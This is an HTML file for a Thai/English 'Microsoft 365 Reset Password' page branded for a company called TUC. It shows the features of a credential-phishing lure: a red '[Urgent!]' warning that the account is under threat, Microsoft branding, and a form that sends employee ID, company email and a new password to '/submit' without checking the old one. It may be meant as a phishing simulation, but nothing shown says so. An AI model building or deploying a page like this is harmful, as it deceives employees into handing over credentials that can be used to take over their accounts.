<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TUC Reset Password Form</title>

    <style>
        /* ====== GLOBAL STYLE ====== */
        body {
            font-family: "Segoe UI", sans-serif;
            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
            margin: 0;
            padding: 0;
            color: #0d47a1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            width: 80%;
            max-width: 1100px;
            background-color: #ffffff;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
            border-radius: 16px;
            overflow: hidden;
        }

        /* ====== LEFT SIDE ====== */
        .left-content {
            flex: 1;
            background: linear-gradient(180deg, #1976d2, #1565c0);
            color: #ffffff;
            padding: 2rem;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .left-content .title {
            font-size: 1.8rem;
            font-weight: bold;
            text-align: center;
            margin-bottom: 1rem;
        }



        .logo {
            width: 200px;                     /* ขนาดโลโก้ (ปรับได้) */
            height: auto;
            display: block;
            margin: 0 auto;
        }


        #2nd-content {
            text-align: center;
        }

        hr {
            border: 1px solid #ffffff;
            width: 60%;
            margin: 0 auto;
        }

        footer {
            text-align: center;
        }

        #Copyright {
            text-align: center;
            font-size: 0.8rem;
            color: #e3f2fd;
        }

        /* ====== RIGHT SIDE ====== */
        .right-content {
            flex: 1;
            padding: 3rem;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background-color: #fafafa;
        }

        form {
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
        }

        label {
            font-weight: bold;
            display: block;
            margin-bottom: 0.3rem;
        }

        .label-sub {
            font-size: 0.9rem;
            color: #1565c0;
            display: block;
            margin-top: 0.2rem;
            font-weight: normal;
        }

        .txt-redmark {
            color: red;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #90caf9;
            border-radius: 8px;
            font-size: 1rem;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #1565c0;
            box-shadow: 0 0 4px #64b5f6;
        }

        button {
            width: 100%;
            padding: 0.9rem;
            background-color: #1976d2;
            color: #ffffff;
            font-size: 1rem;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #0d47a1;
        }

        @media (max-width: 800px) {
            .container {
                flex-direction: column;
                height: auto;
            }

            .left-content, .right-content {
                flex: none;
                width: 100%;
            }

            .right-content {
                padding: 2rem;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <!-- LEFT SECTION -->
        <div class="left-content">
            <span class="title">Microsoft 365 Reset Password</span>
            <div id="ltop-inside">
                <div class="logo-box">
            <img src="/static/img/logo1.jpg" alt="Logo" class="logo">
            </div>

                <div id="2nd-content">
                    <hr>
                    <br>
                    <h1 style="color: rgb(255, 0, 0);">[Urgent!]</h1>
                    <h2 style="font-weight: bold">
                        Email ของคุณถูกภัยคุกคามจากภายนอก กรุณาเปลี่ยนรหัสผ่านอย่างเร่งด่วน<br>
                        <span style="font-size:1rem; font-weight:normal;">Your account may be compromised. Please update your password immediately.</span>
                    </h2>
                </div>
            </div>
            <footer id="lbot-inside">
                <p style="font-size: 1rem; margin-top: 1rem;">
                    เพื่อความปลอดภัย อย่าเปิดเผยรหัสผ่านของคุณให้ผู้อื่น และหลีกเลี่ยงการใช้รหัสผ่านเดิมในบัญชีต่าง ๆ<br>
                    <span style="font-size:0.9rem; color:#e3f2fd;">For your security, please do not share your password with others and avoid reusing old passwords.</span>
                </p>
            </footer>
            <!-- <p id="Copyright">© Copyright, Thai Usui.,Ltd.</p> -->
        </div>

        <!-- RIGHT SECTION -->
        <div class="right-content">
            <form action="/submit" method="POST">
                <label for="empid">
                    รหัสพนักงาน (Employee ID):
                    <span class="txt-redmark">*</span>
                    <span class="label-sub">กรุณากรอกรหัสพนักงานของคุณ / Please enter your employee ID</span>
                </label>
                <input type="text" name="empid" placeholder="Employee ID" required><br><br>
        
                <label for="email">
                    อีเมล์ (Email):
                    <span class="txt-redmark">*</span>
                    <span class="label-sub">กรุณากรอกอีเมล์บริษัท เช่น name@tuc.co.th / Please use your company email</span>
                </label>
                <input type="email" id="email" name="email" required placeholder="name@tuc.co.th"><br><br>
        
                <label for="password">
                    รหัสผ่านใหม่ (New Password):
                    <span class="txt-redmark">*</span>
                    <span class="label-sub">ตั้งรหัสผ่านใหม่ / Set your new password</span>
                </label>
                <input type="password" id="password" name="password" required><br><br>
        
                <button type="submit">รีเซ็ตรหัสผ่าน / Reset Password</button>
            </form>
        </div>
    </div>
</body>
</html>
